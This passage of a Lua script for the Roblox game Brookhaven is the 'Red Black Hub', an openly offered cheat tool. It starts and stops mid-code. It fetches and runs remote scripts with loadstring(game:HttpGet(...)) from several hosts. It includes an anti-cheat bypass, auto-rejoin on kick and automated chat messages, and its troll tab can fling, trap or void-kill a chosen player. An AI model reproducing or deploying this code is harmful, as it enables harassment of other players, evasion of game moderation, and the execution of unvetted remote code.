    loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-R4D-script-no-key-17562"))()
end})

Tab1:AddButton({"INFINITE YIELD", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Infinite-Yield_500"))()
end})

Tab1:AddButton({"TROLL GUI", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Troll-Gui-3874"))()
end})

Tab1:AddButton({"TELEPORT TOOL", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Teleport-Tool-27419"))()
end})

Tab1:AddButton({"TELEKINESIS", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Telekinesis-V5-21542"))()
end})

Tab1:AddButton({"RED BLACK HUB BY RYAN", function()
    loadstring(game:HttpGet('https://redblackhub-protected.vercel.app/script'))()
end})

Tab1:AddButton({"RED BLACK HUB BY VOLTZ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ygagga/Red-Black-hub-1.0-/refs/heads/main/673b292c795c6275.txt"))()
end})

end

--=================================
-- RED BLACK HUB - LOADER
--=================================

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")

local lp = Players.LocalPlayer

-- CONFIG
local LUXURY_KEY = "RBH-Key-broockhaven-X95-B.D.O-e-4rLoP-2058-hms947-qwert_V205.8.vVv2061(©®)"
local DISCORD_LINK = "https://discord.gg/ffuFGauPdS"
local GAMEPASS_ID = 1662810084

--=================================
-- FUNÇÃO LUXURY
--=================================

local function RunLuxuryHub()
	warn("LUXURY HUB STARTED")

	-- COLOQUE O HUB LUXURY AQUI

-- =========================================================
-- Função de envio de mensagem no chat
-- =========================================================
local function SendExecuteMessage(msg)
    local Players = game:GetService("Players")
    local TextChatService = game:GetService("TextChatService")
    
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then  
        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")  
        if channel then  
            pcall(function()  
                channel:SendAsync(msg)  
            end)  
        end  
    else  
        pcall(function()  
            game:GetService("ReplicatedStorage")  
                .DefaultChatSystemChatEvents  
                .SayMessageRequest:FireServer(msg, "All")  
        end)  
    end
end

-- Mensagem inicial
SendExecuteMessage("Red Black hub executed successfully!")

-- Serviços
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")

local lp = Players.LocalPlayer
local pg = lp:WaitForChild("PlayerGui")

-- Sequência de mensagens com delay
task.spawn(function()
    task.wait(1)
    SendExecuteMessage("Thanks for using the Red Black hub Brookhaven.")
    task.wait(1)  
    SendExecuteMessage("You are using the Luxurious version of the Red Black hub.")
end)

--========================================
-- RED BLACK HUB - LOADER CENTRALIZADO MAIOR
--========================================

-- CONFIG
local LOAD_TIME = 6
local HUB_TEXT = "RED BLACK HUB"
local LOGO_ID = "rbxassetid://91667192204008"
local LOADING_TEXTS = {"Loading...", "Loading Functions modules...", "Adding Labels..."}

-- LIMPA LOADER ANTIGO
for _, g in ipairs(pg:GetChildren()) do
    if g:IsA("ScreenGui") and g.Name:lower():find("rbh") then
        g:Destroy()
    end
end

-- BLUR
local blur = Instance.new("BlurEffect", Lighting)
blur.Size = 0
TweenService:Create(blur, TweenInfo.new(0.4), {Size = 18}):Play()

-- GUI PRINCIPAL
local gui = Instance.new("ScreenGui", pg)
gui.Name = "RBH_LOADER"
gui.DisplayOrder = 9999
gui.ResetOnSpawn = false

-- FRAME PRINCIPAL
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 700, 0, 400)
frame.Position = UDim2.new(0.5, 0, 1.2, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(10,10,10)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,28)

-- BORDA RGB
local stroke = Instance.new("UIStroke", frame)
stroke.Thickness = 3
task.spawn(function()
    while frame.Parent do
        stroke.Color = Color3.fromHSV((tick()*0.2)%1,1,1)
        RunService.RenderStepped:Wait()
    end
end)

-- ANIMAÇÃO DE ENTRADA
TweenService:Create(frame, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
    Position = UDim2.new(0.5, 0, 0.45, 0)
}):Play()

-- FUNDO HACKER
local hackerLines = {}
for i = 1, 45 do
    local txt = Instance.new("TextLabel", frame)
    txt.Size = UDim2.new(0,18,1,0)
    txt.Position = UDim2.new(0, math.random(0,680), 0, -400)
    txt.BackgroundTransparency = 1
    txt.Text = string.rep("01\n", math.random(25,45))
    txt.TextColor3 = Color3.fromRGB(255, 0, 0)
    txt.Font = Enum.Font.Code
    txt.TextSize = 14
    txt.ZIndex = 1

    table.insert(hackerLines, txt)  

    task.spawn(function()  
        while txt.Parent do  
            TweenService:Create(  
                txt,  
                TweenInfo.new(math.random(4,7), Enum.EasingStyle.Linear),  
                {Position = UDim2.new(0, txt.Position.X.Offset, 0, 400)}  
            ):Play()  
            task.wait(math.random(1,2))  
        end  
    end)
end

-- LOGO CENTRAL
local logo = Instance.new("ImageLabel", frame)
logo.Size = UDim2.new(0,120,0,120)
logo.Position = UDim2.new(0.5,0,0,30)
logo.AnchorPoint = Vector2.new(0.5,0)
logo.BackgroundTransparency = 1
logo.Image = LOGO_ID
logo.ZIndex = 5

-- TEXTO HUB
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1,0,0,40)
title.Position = UDim2.new(0,0,0,160)
title.BackgroundTransparency = 1
title.Text = HUB_TEXT
title.Font = Enum.Font.GothamBold
title.TextSize = 32
title.TextColor3 = Color3.new(1,1,1)
title.ZIndex = 5

-- TEXTO DE LOADING
local loadingLabel = Instance.new("TextLabel", frame)
loadingLabel.Size = UDim2.new(1,0,0,25)
loadingLabel.Position = UDim2.new(0,0,0,210)
loadingLabel.BackgroundTransparency = 1
loadingLabel.Font = Enum.Font.Gotham
loadingLabel.TextSize = 20
loadingLabel.TextColor3 = Color3.new(1,1,1)
loadingLabel.ZIndex = 5
loadingLabel.Text = LOADING_TEXTS[1]

-- BLOCOS GIRANDO NOS CANTOS
local function createRotatingBlock(pos)
    local block = Instance.new("Frame", frame)
    block.Size = UDim2.new(0,50,0,50)
    block.Position = pos
    block.AnchorPoint = Vector2.new(0.5,0.5)
    block.BackgroundColor3 = Color3.fromRGB(255,0,0)
    Instance.new("UICorner", block).CornerRadius = UDim.new(0,8)
    task.spawn(function()
        while block.Parent do
            TweenService:Create(block, TweenInfo.new(0.6), {
                Rotation = block.Rotation + 180,
                BackgroundColor3 = Color3.fromHSV(math.random(),1,1)
            }):Play()
            task.wait(0.6)
        end
    end)
    return block
end

createRotatingBlock(UDim2.new(0,50,0,50))
createRotatingBlock(UDim2.new(1,-50,0,50))

-- BARRA DE LOADER EM BLOCOS
local loaderContainer = Instance.new("Frame", frame)
loaderContainer.Size = UDim2.new(0, 600, 0, 35)
loaderContainer.Position = UDim2.new(0.5,0,0.85,0)
loaderContainer.AnchorPoint = Vector2.new(0.5,0.5)
loaderContainer.BackgroundColor3 = Color3.fromRGB(50,50,50)
loaderContainer.BorderSizePixel = 0
Instance.new("UICorner", loaderContainer).CornerRadius = UDim.new(0,10)

local numBlocks = 30
local blocks = {}
for i = 1, numBlocks do
    local b = Instance.new("Frame", loaderContainer)
    b.Size = UDim2.new(1/numBlocks, -2, 1, -2)
    b.Position = UDim2.new((i-1)/numBlocks, 1, 0, 1)
    b.BackgroundColor3 = Color3.fromRGB(255,0,0)
    b.BorderSizePixel = 0
    b.BackgroundTransparency = 1
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
    table.insert(blocks, b)
end

-- SOM DE ENTRADA
local s = Instance.new("Sound", SoundService)
s.SoundId = "rbxassetid://9118828569"
s.Volume = 0.6
s:Play()

-- ANIMAÇÃO DO LOADER
for i = 1, numBlocks do
    blocks[i].BackgroundTransparency = 0
    if i % 5 == 0 then
        loadingLabel.Text = LOADING_TEXTS[((i/5-1) % #LOADING_TEXTS)+1]
    end
    task.wait(LOAD_TIME/numBlocks)
end

-- FINALIZAÇÃO
for _, txt in ipairs(hackerLines) do
    TweenService:Create(txt, TweenInfo.new(1.5), {TextTransparency = 1}):Play()
end

TweenService:Create(frame, TweenInfo.new(1.8, Enum.EasingStyle.Quad), {Size = UDim2.new(0,0,0,0)}):Play()
TweenService:Create(blur, TweenInfo.new(1.8), {Size = 0}):Play()
task.wait(1.9)
gui:Destroy()
blur:Destroy()

print("RED BLACK HUB LOADER FINISHED")

-- =========================================================
-- BAN / VERIFICAÇÃO
-- =========================================================
local banidos = {
    ["NHHSIHHSGHHSAHHS"] = true,
}

local bannedStrings = {
    "itz",  
    "ax7",
}

local function isExactNameBanned(player)
    return banidos[player.Name] == true
end

local function isNameContainingBannedWord(player)
    local name = string.lower(player.Name)  
    local display = string.lower(player.DisplayName)  
    for _, word in ipairs(bannedStrings) do  
        if string.find(name, word) or string.find(display, word) then  
            return true  
        end  
    end  
    return false
end

local function verificarBan(player)
    local ok, res = pcall(function()  
        if isExactNameBanned(player) or isNameContainingBannedWord(player) then  
            player:Kick("Proibido no Red Black Hub.")  
            return true  
        end  
        return false  
    end)  
    if not ok then  
        warn("Erro verificando ban:", res)  
        return false  
    end  
    return res
end

local LocalPlayer = Players.LocalPlayer
if LocalPlayer then
    verificarBan(LocalPlayer)
end

-- =========================================================
-- RP NAME + BIO (BROOKHAVEN FIX)
-- =========================================================
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RE = ReplicatedStorage:WaitForChild("RE")
local RPRemote = RE:WaitForChild("1RPNam1eTex1t")
local ColorRemote = RE:WaitForChild("1RPNam1eColo1r")

-- RP NAME
RPRemote:FireServer("RolePlayName", "{RED BLACK HUB | BROOKHAVEN}")

-- RP NAME COLOR (RED)
ColorRemote:FireServer("PickingRPNameColor", Color3.fromRGB(255, 0, 0))

-- RP BIO TEXT
local bioText
if lp.Name:lower() == "scarys_cary66666" then
    bioText = "OWNER OF RED BLACK HUB"
else
    bioText = "Hello " .. lp.DisplayName
end

RPRemote:FireServer("RolePlayBio", bioText)

-- RP BIO COLOR (BLACK)
ColorRemote:FireServer("PickingRPBioColor", Color3.fromRGB(0, 0, 0))

-- =========================================================
-- AUDIO LOGIC (SISTEMA DE SEQUÊNCIA DE AUDIO)
-- =========================================================
local sons = {
    "rbxassetid://94509403808673",  
    "rbxassetid://130219836212781",  
    "rbxassetid://78430692054916",  
    "rbxassetid://154345248",  
    "rbxassetid://87484814057059",  
    "rbxassetid://113491014204126",  
    "rbxassetid://110983956928751",  
    "rbxassetid://80344181334677",  
    "rbxassetid://97529429187942",  
    "rbxassetid://5858548244",  
    "rbxassetid://15929797051",  
    "rbxassetid://113118633294800",  
    "rbxassetid://113028772835303",  
    "rbxassetid://102566984907215",  
    "rbxassetid://100835951102315",  
    "rbxassetid://4810729995",  
    "rbxassetid://78430692054916"
}

_G.somIndex = _G.somIndex or 0

local function PlayNextSound()
    _G.somIndex = _G.somIndex + 1
    if _G.somIndex > #sons then
        _G.somIndex = 1
    end
    
    local tiro = Instance.new("Sound")
    tiro.SoundId = sons[_G.somIndex]
    tiro.Volume = 1
    tiro.Parent = SoundService
    tiro:Play()
    
    task.delay(5, function()
        tiro:Destroy()
    end)
end

-- =========================================================
-- SPLASH SEQUENCIAL COM FADE E DESFOQUE
-- =========================================================
local CoreGui = game:GetService("CoreGui")  
local ContentProvider = game:GetService("ContentProvider")  

local function runSplashSequence()  
    local totalTime = 4
    local half = totalTime / 2  

    local old = CoreGui:FindFirstChild("RBH_Splash")  
    if old then old:Destroy() end  

    -- Ativa desfoque no Lighting durante os Splashes
    local splashBlur = Instance.new("BlurEffect", Lighting)
    splashBlur.Size = 20

    local guiSplash = Instance.new("ScreenGui")  
    guiSplash.Name = "RBH_Splash"  
    guiSplash.IgnoreGuiInset = true  
    guiSplash.ResetOnSpawn = false  
    guiSplash.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  
    guiSplash.Parent = CoreGui  

    local img = Instance.new("ImageLabel")  
    img.Name = "Splash"  
    img.BackgroundTransparency = 1  
    img.AnchorPoint = Vector2.new(0.5, 0.5)  
    img.Position = UDim2.fromScale(0.5, 0.5)  
    img.Size = UDim2.fromScale(0.35, 0.35)  
    img.ImageTransparency = 1  
    img.Parent = guiSplash  

    local corner = Instance.new("UICorner")  
    corner.CornerRadius = UDim.new(0, 16)  
    corner.Parent = img  

    -- TAbela com a ordem das imagens que vão rodar sequencialmente
    local imageSequence = {
        "116836698110493",
        "91667192204008"
    }

    -- Roda uma imagem de cada vez
    for _, assetId in ipairs(imageSequence) do
        img.Image = "rbxassetid://" .. tostring(assetId)
        
        pcall(function()  
            ContentProvider:PreloadAsync({ img.Image })  
        end)  

        -- Toca o som respectivo da iteração atual
        PlayNextSound()

        local fadeIn = TweenService:Create(  
            img,  
            TweenInfo.new(half, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),  
            { ImageTransparency = 0 }  
        )  
        local fadeOut = TweenService:Create(  
            img,  
            TweenInfo.new(half, Enum.EasingStyle.Quad, Enum.EasingDirection.In),  
            { ImageTransparency = 1 }  
        )  

        fadeIn:Play()
        fadeIn.Completed:Wait()  
        
        task.wait(0.2) -- Pequena pausa estável com a imagem visível antes de sumir
        
        fadeOut:Play()
        fadeOut.Completed:Wait()  
        
        task.wait(0.1) -- Intervalo rápido entre uma troca de imagem e outra
    end

    -- Limpa toda a estrutura e desliga o desfoque gradualmente
    guiSplash:Destroy()  
    TweenService:Create(splashBlur, TweenInfo.new(0.4), {Size = 0}):Play()
    task.delay(0.4, function() splashBlur:Destroy() end)
end  

-- Executa toda a sequência de splash travando o script aqui até terminar
runSplashSequence()

-- =========================================================
-- EXECUÇÃO DO HUB (SÓ COMEÇA APÓS TERMINAR OS SPLASHES)
-- =========================================================
local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/LibraryRobloc/refs/heads/main/RedzLibrary.lua"))()

local Window = redzlib:MakeWindow({
  Title = "RED BLACK HUB-BROOKHAVEN",
  SubTitle = "HUB VERSION:3.066:PRO",
  SaveFolder = "RedBlackHub_Brookhaven.json"
})

Window:AddMinimizeButton({
    Button = {
        Image = "rbxassetid://116836698110493",
        BackgroundTransparency = 1,
        Size = UDim2.new(0, 70, 0, 70) -- tamanho maior
    },

    Corner = {
        CornerRadius = UDim.new(30000, 10000)
    }
})

-- ==========================================
-- TAB INFO
-- ==========================================
local TabInfo = Window:MakeTab({"TAB INFO", "info"})

TabInfo:AddParagraph({"HUB DEVS:", "HUB VERSION:367:PRO"})

TabInfo:AddDiscordInvite({
    Name = "RED BLACK COMMUNITY",
    Description = "Join our official Discord server!",
    Logo = "rbxassetid://91667192204008",
    Invite = "https://discord.gg/9yYA4gHrPJ",
})

TabInfo:AddButton({"COPY YOUTUBE", function()
    setclipboard("https://m.youtube.com/@THE_MR_RED_BLACK_SCRIPTS_OWNER")
end})

TabInfo:AddButton({"COPY TIKTOK", function()
    setclipboard("https://www.tiktok.com/@the_mr_red_black_owner?_r=1&_t=ZS-92VA3VA1kST")
end})

TabInfo:AddParagraph({"HUB DEVS:", "The Mr Red Black Scripts Owner\nPedro of war\nThe Clock Work Dev"})

TabInfo:AddParagraph({"IDEAS:", "The Mr Red Black Scripts Owner\nKALEBAO\nThe Mr Dog\nBolota\nSlow\nAbacate\nGabriel\nrinkzada\nStreex\nThe Clock Work Dev\nStell Win\nEggman"})

TabInfo:AddParagraph({"HUB TESTERS:", "The Mr Red Black Scripts Owner\nKALEBAO\nThe Mr Dog\nKystrypkry\nBolota\nLeopys\nSlow\nCarlinhos Cavalos\nBlack\nmimiwhat\nSkynZ\nStarFarer\nShadow\nRyan\nRed Black\nStreex\nThe Clock Work Dev\nStell Win\nEggman"})

TabInfo:AddParagraph({"WARNING", "If you get banned using the Red Black hub, send a screenshot to the Red Black Community.\nWe are 30% responsible for your ban.\nIn other words, we're going to try to unban you from the game."})

TabInfo:AddParagraph({"HELP US", "Also, if you're a developer too, feel free to help me with the scripts if you'd like."})

-- ==========================================
-- TAB MAIN
-- ==========================================
local Tab5 = Window:MakeTab({"MAIN", "home"})

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local GuiService = game:GetService("GuiService")
local LocalPlayer = Players.LocalPlayer
local LP = Players.LocalPlayer

-- AUTO REJOIN ON KICK
local AutoRejoinEnabled = false
local KickConnection

Tab5:AddToggle({
    Name = "AUTO REJOIN ON KICK",
    Default = false,
    Callback = function(state)
        AutoRejoinEnabled = state

        if KickConnection then
            KickConnection:Disconnect()
            KickConnection = nil
        end

        if state then
            KickConnection = GuiService.ErrorMessageChanged:Connect(function(msg)
                if AutoRejoinEnabled and msg and msg ~= "" then
                    task.wait(1)
                    TeleportService:TeleportToPlaceInstance(
                        game.PlaceId,
                        game.JobId,
                        LocalPlayer
                    )
                end
            end)
        end
    end
})

-- COPY SERVER ID
Tab5:AddButton({"COPY SERVER ID", function()
    if setclipboard then
        setclipboard(game.JobId)
    end
end})

-- ANTI CHEAT BYPASS
Tab5:AddButton({"ANTI CHEAT BYPASS", function()
    for _,obj in ipairs(game:GetDescendants()) do
        if obj.Name then
            local n = string.lower(obj.Name)
            if n == "anticheat" or n == "exploit" then
                pcall(function()
                    obj:Destroy()
                end)
            end
        end
    end
end})

-- REJOIN
Tab5:AddButton({"REJOIN", function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
end})

-- JOIN/EXIT NOTIFICATION
local monitorConnections = {}

local function GetPlayerThumbnail(userId)
    local thumbType = Enum.ThumbnailType.HeadShot
    local thumbSize = Enum.ThumbnailSize.Size100x100
    local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
    return content
end

local function Notify(playerName, joined)
    local text = joined and ("PLAYER %s JOINED"):format(playerName) or ("PLAYER %s LEFT"):format(playerName)
    local player = Players:FindFirstChild(playerName)
    local icon = nil
    if player then
        icon = GetPlayerThumbnail(player.UserId)
    end
    game.StarterGui:SetCore("SendNotification", {
        Title = "RED BLACK HUB",
        Text = text,
        Icon = icon or "",
        Duration = 5
    })
end

Tab5:AddToggle({
    Name = "JOIN/EXIT NOTIFICATION",
    Default = false,
    Callback = function(state)
        for _, conn in pairs(monitorConnections) do
            conn:Disconnect()
        end
        monitorConnections = {}

        if state then
            table.insert(monitorConnections, Players.PlayerAdded:Connect(function(p)
                Notify(p.Name, true)
            end))

            table.insert(monitorConnections, Players.PlayerRemoving:Connect(function(p)
                Notify(p.Name, false)
            end))
        end
    end
})

-- COPY COORDINATES
Tab5:AddButton({"COPY COORDINATES", function()
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local pos = player.Character.HumanoidRootPart.Position
        setclipboard(string.format("X: %d, Y: %d, Z: %d", pos.X, pos.Y, pos.Z))
        print("Coordenadas copiadas para a area de transferencia: ", pos)
    else
        print("Nao foi possivel obter as coordenadas.")
    end
end})

-- GOTO SAFE ZONE
Tab5:AddButton({"GOTO SAFE ZONE", function()
    local char = LP.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    hrp.CFrame = CFrame.new(1080, 76, -1070)
end})

-- SET SPAWNPOINT
local spawnCFrame = nil

Tab5:AddButton({"SET SPAWNPOINT", function()
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        spawnCFrame = player.Character.HumanoidRootPart.CFrame
        print("Ponto de spawn definido!")
        
        game.StarterGui:SetCore("SendNotification", {
            Title = "SpawnPoint",
            Text = "Seu ponto de spawn foi salvo!",
            Duration = 5
        })
    else
        print("Nao foi possivel definir o ponto de spawn.")
    end
end})

game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
    if spawnCFrame then
        local hrp = char:WaitForChild("HumanoidRootPart", 10)
        if hrp then
            hrp.CFrame = spawnCFrame
            print("Teleportado para o ponto de spawn salvo!")
        end
    end
end)

-- ANTI AFK
local function antiAFK()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    
    local function moverJogador()
        humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, 0.1)
        task.wait(1)
        humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -0.1)
    end

    while true do
        task.wait(600)
        moverJogador()
    end
end

Tab5:AddButton({"ANTI AFK", function()
    task.spawn(antiAFK)
end})

Window:SelectTab(TabInfo)

-- ==========================================
-- TAB TROLL
-- ==========================================
do
    local TabTroll = Window:MakeTab({"TROLL", "skull"})

    local Players = game:GetService("Players")
    local LP = Players.LocalPlayer
    local RunService = game:GetService("RunService")
    local Camera = workspace.CurrentCamera
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local selectedPlayerName = ""
    local selectedFlingType = "FLING"
    local orbitRadius = 6
    local orbitSpeed = 0.05
    local DISTANCE = 2

    local activeConnections = {}

    local function FindTarget(name)
        if not name or name == "" then return nil end
        name = name:lower()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and (plr.Name:lower():find(name) or plr.DisplayName:lower():find(name)) then
                return plr
            end
        end
        return nil
    end

    local function GetDynamicOffset(thrp)
        local isMoving = thrp.AssemblyLinearVelocity.Magnitude > 2
        return isMoving and 20 or 3
    end

    local function ClearConnection(key)
        if activeConnections[key] then
            if type(activeConnections[key]) == "thread" then
                task.cancel(activeConnections[key])
            elseif typeof(activeConnections[key]) == "RBXScriptConnection" then
                activeConnections[key]:Disconnect()
            end
            activeConnections[key] = nil
        end
        if LP.Character then
            local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end

    local function SpawnAndSitBoat()
        local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return nil end

        hrp.CFrame = CFrame.new(1620, -3, -318)
        task.wait(0.2)

        local re = ReplicatedStorage:FindFirstChild("RE")
        if re and re:FindFirstChild("1Ca1r") then
            local args = {
                [1] = "PickingBoat",
                [2] = "PirateFree",
                [3] = "Boat"
            }
            re["1Ca1r"]:FireServer(unpack(args))
        end

        task.wait(0.4)
        hrp.CFrame = CFrame.new(1647, 16, -327)
        task.wait(0.3)

        return workspace:FindFirstChild(LP.Name .. "Car")
    end

    TabTroll:AddTextBox({
        Name = "PLAYER NAME",
        Description = "Enter target player name",
        PlaceholderText = "Username or Display...",
        Callback = function(text)
            selectedPlayerName = text
        end
    })

    TabTroll:AddButton({"GET COUCH", function()
        local RS = ReplicatedStorage
        if RS:FindFirstChild("RE") and RS.RE:FindFirstChild("1Too1l") then
            RS.RE["1Too1l"]:InvokeServer("PickingTools", "Couch")
            task.wait(0.2)

            local backpack = LP:FindFirstChild("Backpack")
            local character = LP.Character
            if backpack and character then
                local couch = backpack:FindFirstChild("Couch")
                if couch then
                    character:FindFirstChildOfClass("Humanoid"):EquipTool(couch)
                end
            end
        end
    end})

    TabTroll:AddSection({"Basic Functions"})

    TabTroll:AddButton({"GO TO PLAYER", function()
        local target = FindTarget(selectedPlayerName)
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, DISTANCE)
        end
    end})

    TabTroll:AddToggle({
        Name = "STICK PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("STICK PLAYER")
            if state then
                activeConnections["STICK PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                        LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, DISTANCE)
                    end
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "VIEW",
        Default = false,
        Callback = function(state)
            ClearConnection("VIEW")
            if state then
                activeConnections["VIEW"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if target and target.Character then
                        Camera.CameraSubject = target.Character:FindFirstChildOfClass("Humanoid")
                    end
                end)
            else
                if LP.Character then
                    Camera.CameraSubject = LP.Character:FindFirstChildOfClass("Humanoid")
                end
            end
        end
    })

    TabTroll:AddToggle({
        Name = "ORBITING PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("ORBITING")
            if state then
                local angle = 0
                activeConnections["ORBITING"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                        angle = angle + orbitSpeed
                        local x, z = math.cos(angle) * orbitRadius, math.sin(angle) * orbitRadius
                        LP.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.HumanoidRootPart.Position + Vector3.new(x, 2, z), target.Character.HumanoidRootPart.Position)
                    end
                end)
            end
        end
    })

    TabTroll:AddDropdown({
        Name = "FLING METHOD",
        Description = "Select Fling Velocity Mode",
        Options = {"FLING", "TELEPORT+FLING"},
        Default = "FLING",
        Callback = function(val)
            selectedFlingType = val
        end
    })

    TabTroll:AddSection({"Heavy Trolls"})

    TabTroll:AddToggle({
        Name = "FLING COUCH",
        Default = false,
        Callback = function(state)
            ClearConnection("FLING COUCH")
            if state then
                local rotX, rotY, rotZ = 0, 0, 0

                activeConnections["FLING COUCH"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if not hrp then return end

                    if hum and hum.Sit then
                        if selectedFlingType == "FLING" then
                            hrp.AssemblyLinearVelocity = Vector3.new(0, 999999999, 0)
                            hrp.CFrame = CFrame.new(0, 999999, 0)
                        else
                            hrp.CFrame = CFrame.new(0, 1e18, 0)
                        end
                        ClearConnection("FLING COUCH")
                        return
                    end

                    hrp.AssemblyLinearVelocity = Vector3.new(40000, 40000, 40000)
                    hrp.AssemblyAngularVelocity = Vector3.new(40000, 40000, 40000)

                    rotX = rotX + 90
                    rotY = rotY + 120
                    rotZ = rotZ + 90

                    hrp.CFrame = thrp.CFrame * CFrame.Angles(math.rad(rotX), math.rad(rotY), math.rad(rotZ))
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "BRING PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("BRING PLAYER")
            if state then
                local angle1, angle2 = 0, 0
                local lastPos = LP.Character and LP.Character.HumanoidRootPart.CFrame
                activeConnections["BRING PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character.HumanoidRootPart
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if hum and hum.Sit then
                        if lastPos then hrp.CFrame = lastPos end
                        ClearConnection("BRING PLAYER")
                        return
                    end

                    local dist = GetDynamicOffset(thrp)

                    angle1 = angle1 + 1.2
                    angle2 = angle2 + 1.8
                    local x, y, z = math.cos(angle1) * dist, math.sin(angle2) * dist, math.sin(angle1) * dist
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 60, 0)
                    hrp.CFrame = CFrame.new(thrp.Position + Vector3.new(x, y, z)) * CFrame.Angles(angle1, angle2, angle1)
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "PRISON PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("PRISON PLAYER")
            if state then
                local angle1, angle2 = 0, 0
                activeConnections["PRISON PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character.HumanoidRootPart
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if hum and hum.Sit then
                        hrp.CFrame = CFrame.new(55, 34, 631)
                        ClearConnection("PRISON PLAYER")
                        return
                    end

                    local dist = GetDynamicOffset(thrp)

                    angle1 = angle1 + 1.2
                    angle2 = angle2 + 1.8
                    local x, y, z = math.cos(angle1) * dist, math.sin(angle2) * dist, math.sin(angle1) * dist
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 60, 0)
                    hrp.CFrame = CFrame.new(thrp.Position + Vector3.new(x, y, z)) * CFrame.Angles(angle1, angle2, angle1)
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "VOID KILL PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("VOID KILL PLAYER")
            if state then
                local angle1, angle2 = 0, 0
                activeConnections["VOID KILL PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character.HumanoidRootPart
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if hum and hum.Sit then
                        hrp.CFrame = CFrame.new(0, -900, 0)
                        ClearConnection("VOID KILL PLAYER")
                        return
                    end

                    local dist = GetDynamicOffset(thrp)

                    angle1 = angle1 + 1.2
                    angle2 = angle2 + 1.8
